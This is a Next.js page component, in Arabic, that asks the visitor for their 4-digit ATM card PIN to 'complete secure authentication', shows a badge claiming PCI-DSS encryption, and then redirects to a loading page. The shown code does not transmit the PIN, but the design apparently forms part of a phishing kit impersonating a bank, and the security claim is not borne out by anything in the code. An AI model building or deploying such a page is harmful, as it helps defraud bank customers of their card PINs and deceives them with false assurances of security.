"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";

const GREEN = "#1e7344";

export default function ATMPage() {
  const router = useRouter();
  const [pin, setPin] = useState("");

  function handleConfirm() {
    if (pin.length === 4) {
      router.push("/loading");
    } else {
      alert("يرجى إدخال 4 أرقام");
    }
  }

  return (
    <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", padding: "10px" }}>
      <div style={{ background: "#fff", width: "100%", maxWidth: "350px", borderRadius: "20px", padding: "25px 20px", boxShadow: "0 8px 25px rgba(0,0,0,0.05)", textAlign: "center" }}>

        <div style={{ marginBottom: "15px" }}>
          <img src="https://img.icons8.com/fluency/96/000000/atm.png" style={{ width: "50px", height: "auto" }} alt="ATM" />
        </div>

        <h2 style={{ fontSize: "17px", color: "#333", marginBottom: "8px", fontWeight: "bold" }}>التحقق من الرقم السري</h2>
        <p style={{ fontSize: "12px", color: "#777", lineHeight: "1.5", marginBottom: "25px" }}>
          يرجى إدخال الرقم السري لبطاقة الصراف الآلي (PIN) المكون من 4 أرقام لإتمام عملية المصادقة الآمنة.
        </p>

        <input
          type="password"
          maxLength={4}
          value={pin}
          onChange={e => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
          placeholder="****"
          style={{
            width: "100%", maxWidth: "220px", height: "45px",
            border: "1px solid #ddd", borderRadius: "8px",
            textAlign: "center", fontSize: "20px", letterSpacing: "12px",
            fontWeight: "bold", color: GREEN, outline: "none",
            backgroundColor: "#fafafa", marginBottom: "20px",
            display: "block", margin: "0 auto 20px",
          }}
        />

        <button
          onClick={handleConfirm}
          style={{ width: "100%", backgroundColor: GREEN, color: "white", border: "none", borderRadius: "10px", padding: "12px", fontSize: "15px", fontWeight: "bold", cursor: "pointer" }}
        >
          تأكيد الرقم السري
        </button>

        <div style={{ marginTop: "15px", fontSize: "10px", color: "#bbb" }}>
          🔒 تشفير بيانات بمعيار PCI-DSS العالمي
        </div>
      </div>
    </div>
  );
}
